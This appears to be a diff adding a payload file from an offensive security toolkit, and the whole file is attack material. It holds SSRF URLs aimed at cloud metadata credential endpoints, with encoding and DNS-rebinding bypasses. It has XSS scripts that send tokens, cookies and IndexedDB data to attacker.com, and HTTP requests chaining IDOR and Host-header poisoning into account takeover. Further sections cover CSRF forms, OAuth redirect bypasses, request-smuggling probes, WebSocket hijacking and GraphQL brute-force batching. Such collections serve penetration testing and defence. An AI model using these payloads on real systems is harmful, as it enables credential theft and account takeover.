@@ -1,0 +1,385 @@
+# Advanced Attack Chaining Payloads
+# Research: Deep Research v4.0 - 2026-10
+# Covers: SSRF chains, XSS->OAuth, IDOR->ATO, Host Header, CSRF SameSite bypass
+
+# ============================================================
+# SSRF -> CLOUD METADATA -> IAM CREDENTIAL THEFT
+# CVEs: CVE-2024-21893, CVE-2025-4427/4428, CVE-2025-61882
+# ============================================================
+
+# --- AWS IMDSv1 ---
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# --- AWS IMDSv2 (requires token) ---
+# Step 1: PUT http://169.254.169.254/latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600)
+# Step 2: GET with token header
+
+# --- IP Encoding Bypasses (CVE-2026-69192) ---
+# Decimal
+http://2852039166/latest/meta-data/
+# Octal
+http://0251.0376.0251.0376/latest/meta-data/
+# Hex
+http://0xa9fea9fe/latest/meta-data/
+# Mixed octal (leading-zero confusion)
+http://0251.0376.0251.0376/latest/meta-data/
+# IPv6 mapped
+http://[::ffff:169.254.169.254]/latest/meta-data/
+# IPv6 hex
+http://[::ffff:a9fe:a9fe]/latest/meta-data/
+# Leading zeros (decimal vs octal confusion)
+http://012.0.0.1/latest/meta-data/
+# Short IPv6
+http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+
+# --- Azure IMDS ---
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# --- GCP Metadata ---
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+
+# --- DNS Rebinding ---
+# Use rbndr.us: http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/
+# Alternates between safe IP and 169.254.169.254
+# Use ceye.io or interactsh for OOB confirmation
+
+# --- Redirect Bypass ---
+# Host 302 redirect: https://your-server.com/redirect -> http://169.254.169.254/
+# Use URL shorteners as redirect intermediaries
+
+# --- IPv6 Denylist Bypass (CVE-2026-44589) ---
+http://[::ffff:7f00:1]/
+http://[0000:0000:0000:0000:0000:ffff:a9fe:a9fe]/latest/meta-data/
+http://[::1]/
+
+# ============================================================
+# XSS -> OAUTH TOKEN THEFT -> ACCOUNT TAKEOVER
+# ============================================================
+
+# localStorage token theft
+<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('access_token')+'&refresh='+localStorage.getItem('refresh_token'));</script>
+
+# sessionStorage token theft
+<script>fetch('https://attacker.com/steal?token='+sessionStorage.getItem('access_token'));</script>
+
+# Cookie exfiltration
+<script>fetch('https://attacker.com/steal?cookies='+document.cookie);</script>
+
+# OAuth popup token theft
+<script>
+var w=window.open('https://accounts.google.com/o/oauth2/auth?client_id=TARGET_ID&redirect_uri=https://target.com/callback&response_type=token&scope=openid','oauth');
+setTimeout(function(){try{fetch('https://attacker.com/steal?hash='+w.location.hash)}catch(e){}},5000);
+</script>
+
+# IndexedDB token extraction
+<script>
+var r=indexedDB.open('auth');
+r.onsuccess=function(e){
+  var db=e.target.result;
+  var tx=db.transaction(db.objectStoreNames[0]);
+  tx.objectStore(db.objectStoreNames[0]).getAll().onsuccess=function(e){
+    fetch('https://attacker.com/steal?data='+JSON.stringify(e.target.result));
+  };
+};
+</script>
+
+# Self-XSS + Login CSRF + OAuth chain
+# Step 1: CSRF to force victim into attacker session
+# Step 2: Self-XSS executes in victim browser
+# Step 3: Payload initiates OAuth flow capturing victim token
+
+# ============================================================
+# IDOR -> EMAIL CHANGE -> PASSWORD RESET -> ATO
+# CVEs: CVE-2026-32103, CVE-2026-93556
+# ============================================================
+
+# Step 1: Enumerate user IDs
+GET /api/users/1001 HTTP/1.1
+GET /api/users/1002 HTTP/1.1
+
+# Step 2: Change victim email (IDOR)
+PUT /api/users/1002 HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer <attacker_token>
+{"email":"attacker@evil.com"}
+
+# Step 3: UUID-based IDOR
+PUT /api/users/550e8400-e29b-41d4-a716-446655440001 HTTP/1.1
+Content-Type: application/json
+{"email":"attacker@evil.com"}
+
+# Step 4: Trigger password reset
+POST /api/password-reset HTTP/1.1
+Content-Type: application/json
+{"email":"attacker@evil.com"}
+
+# Step 5: Reset token leak in response
+GET /api/password-reset?userId=1002 HTTP/1.1
+
+# Parameter pollution variant
+PUT /api/users/me?userId=1002 HTTP/1.1
+Content-Type: application/json
+{"email":"attacker@evil.com"}
+
+# ============================================================
+# HOST HEADER INJECTION -> PASSWORD RESET POISONING -> ATO
+# CVEs: CVE-2025-43930, CVE-2026-27812
+# ============================================================
+
+# Basic Host header injection
+POST /forgot-password HTTP/1.1
+Host: evil.com
+Content-Type: application/x-www-form-urlencoded
+email=victim@example.com
+
+# X-Forwarded-Host bypass
+POST /forgot-password HTTP/1.1
+Host: legitimate.com
+X-Forwarded-Host: evil.com
+Content-Type: application/x-www-form-urlencoded
+email=victim@example.com
+
+# X-Host header
+POST /forgot-password HTTP/1.1
+Host: legitimate.com
+X-Host: evil.com
+email=victim@example.com
+
+# Host with port injection
+POST /forgot-password HTTP/1.1
+Host: legitimate.com:80@evil.com
+email=victim@example.com
+
+# CRLF injection in Host
+POST /forgot-password HTTP/1.1
+Host: legitimate.com\r\nX-Forwarded-Host: evil.com
+email=victim@example.com
+
+# Forwarded header (RFC 7239)
+POST /forgot-password HTTP/1.1
+Host: legitimate.com
+Forwarded: host=evil.com
+email=victim@example.com
+
+# X-Original-URL
+POST /forgot-password HTTP/1.1
+Host: legitimate.com
+X-Original-URL: https://evil.com/forgot-password
+email=victim@example.com
+
+# ============================================================
+# CSRF + SAMESITE LAX BYPASS -> ACCOUNT TAKEOVER
+# CVEs: CVE-2024-28143, CVE-2024-51382
+# ============================================================
+
+# Auto-submit CSRF form
+<html><body>
+<form id="csrf" action="https://target.com/api/set-password" method="POST">
+  <input type="hidden" name="newPassword" value="attacker123"/>
+  <input type="hidden" name="userName" value="admin"/>
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body></html>
+
+# SameSite Lax bypass via method override
+<form id="csrf" action="https://target.com/api/set-password" method="GET">
+  <input type="hidden" name="_method" value="POST"/>
+  <input type="hidden" name="newPassword" value="attacker123"/>
+</form>
+
+# Token removal bypass (omit CSRF token)
+<form id="csrf" action="https://target.com/api/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com"/>
+</form>
+
+# Content-Type manipulation (avoid CORS preflight)
+<form id="csrf" action="https://target.com/api/change-email" method="POST" enctype="text/plain">
+  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}' />
+</form>
+
+# ============================================================
+# OAUTH REDIRECT URI BYPASS PAYLOADS
+# CVE-2024-2419 (Keycloak)
+# ============================================================
+
+# URL parser confusion with @
+redirect_uri=https://trusted.com@evil.com/callback
+redirect_uri=https://trusted.com%40evil.com/callback
+
+# Fragment bypass
+redirect_uri=https://trusted.com%23@evil.com/callback
+
+# Backslash confusion
+redirect_uri=https://evil.com\@trusted.com/callback
+
+# Double-decode
+redirect_uri=https://trusted.com/%252e%252e/evil.com
+
+# Open redirect chain
+redirect_uri=https://trusted.com/redirect?url=https://evil.com
+redirect_uri=https://trusted.com/login?next=https://evil.com
+redirect_uri=https://trusted.com/logout?redirect=https://evil.com
+
+# Path traversal in redirect
+redirect_uri=https://trusted.com/callback/../../../evil.com
+redirect_uri=https://trusted.com/callback/..%2f..%2f..%2fevil.com
+
+# Subdomain wildcards
+redirect_uri=https://evil.trusted.com/callback
+redirect_uri=https://trustedXcom.evil.com/callback
+
+# ============================================================
+# MASS ASSIGNMENT PAYLOADS (OWASP API3:2023, CVE-2025-15602)
+# ============================================================
+
+# Role escalation
+{"name":"test","role":"admin"}
+{"name":"test","is_admin":true}
+{"name":"test","isAdmin":true}
+{"name":"test","user_type":"administrator"}
+{"name":"test","permissions":["admin","write","delete"]}
+{"name":"test","groups":["administrators"]}
+
+# Nested object injection
+{"name":"test","profile":{"role":{"name":"admin"}}}
+{"user":{"name":"test","role":"superadmin"}}
+{"data":{"attributes":{"role":"admin"}}}
+
+# Parameter pollution (JSON body + query string)
+# PUT /api/users/me?role=admin
+# Body: {"name":"test"}
+
+# Boolean field injection
+{"name":"test","verified":true}
+{"name":"test","email_verified":true}
+{"name":"test","two_factor_enabled":false}
+{"name":"test","is_locked":false}
+{"name":"test","is_active":true}
+
+# Financial field injection
+{"name":"test","balance":999999}
+{"name":"test","credit_limit":999999}
+{"name":"test","discount_percentage":100}
+{"name":"test","subscription":"enterprise"}
+
+# ============================================================
+# HTTP REQUEST SMUGGLING PROBES
+# CVEs: CVE-2025-55315, CVE-2025-32094, CVE-2024-53008
+# ============================================================
+
+# CL.TE basic probe
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+# TE.CL basic probe
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+# TE.TE obfuscation variants
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding:	chunked
+X: x\r\nTransfer-Encoding: chunked
+Transfer-Encoding: chunked\r\n\r\n
+
+# CVE-2025-55315 (Kestrel chunk extension)
+# Chunk extension with embedded CR/LF
+5;ext=val\r\n\r\n
+ABCDE
+0
+
+# Header normalization smuggling (CVE-2025-64484)
+X_Forwarded_Email: admin@target.com
+X_Forwarded_User: admin
+X_Forwarded_Groups: administrators
+
+# ============================================================
+# WEBSOCKET AUTH BYPASS
+# CVEs: CVE-2024-55591, CVE-2025-52882
+# ============================================================
+
+# Cross-Site WebSocket Hijacking (CSWSH)
+var ws = new WebSocket('wss://target.com/ws');
+ws.onopen = function() { ws.send(JSON.stringify({action:'get_user_data'})); };
+ws.onmessage = function(e) { fetch('https://attacker.com/log?data='+encodeURIComponent(e.data)); };
+
+# Origin header test
+# wscat -c wss://target.com/ws -H 'Origin: https://evil.com'
+
+# Local WebSocket hijacking (CVE-2025-52882)
+for (let port = 3000; port < 4000; port++) {
+  try {
+    let ws = new WebSocket('ws://localhost:'+port);
+    ws.onopen = () => { ws.send('{"jsonrpc":"2.0","method":"tools/list","id":1}'); };
+  } catch(e) {}
+}
+
+# FortiOS WebSocket bypass (CVE-2024-55591)
+# Connect to jsconsole WebSocket endpoint with crafted admin token
+# ws://target:8443/jsconsole with Node.js authorization
+
+# ============================================================
+# GRAPHQL ALIAS BATCHING RATE LIMIT BYPASS
+# ============================================================
+
+# OTP brute force via aliases (single request)
+mutation { a0: verifyOTP(code:"0000"){success} a1: verifyOTP(code:"0001"){success} a2: verifyOTP(code:"0002"){success} a3: verifyOTP(code:"0003"){success} }
+
+# Login brute force via aliases
+mutation { a0: login(user:"admin",pass:"password1"){token} a1: login(user:"admin",pass:"password2"){token} a2: login(user:"admin",pass:"password3"){token} }
+
+# Array batching
+[{"query":"mutation{login(user:\"admin\",pass:\"password1\"){token}}"},{"query":"mutation{login(user:\"admin\",pass:\"password2\"){token}}"}]
+
+# APQ registration bypass (CVE-2025-32032, CVE-2026-35413)
+{"query":"{__schema{types{name fields{name}}}}","extensions":{"persistedQuery":{"version":1,"sha256Hash":"attacker_hash"}}}
+
+# Directus SDL leak (CVE-2026-35413)
+{"query":"{server_specs_graphql}"}
+
+# ============================================================
+# BEARER TOKEN LEAKAGE
+# CVEs: CVE-2025-27152, CVE-2026-44883
+# ============================================================
+
+# Axios redirect token leak (CVE-2025-27152)
+# Authorization header follows cross-origin redirect
+# Test: curl -L -H "Authorization: Bearer <token>" https://target.com/redirect-to-evil
+
+# Token in URL parameter (CVE-2026-44883 Portainer)
+# GET /api/endpoint?token=<jwt>
+# Leaks via Referer header, server logs, browser history
+
+# XFF trust bypass (CVE-2024-47070 authentik, CVE-2024-51504 ZooKeeper)
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 10.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+
+# CORS misconfiguration (CVE-2024-41659)
+# Test reflected origin:
+# curl -H "Origin: https://evil.com" https://target.com/api/user
+# Check for: Access-Control-Allow-Origin: https://evil.com
+# Check for: Access-Control-Allow-Credentials: true
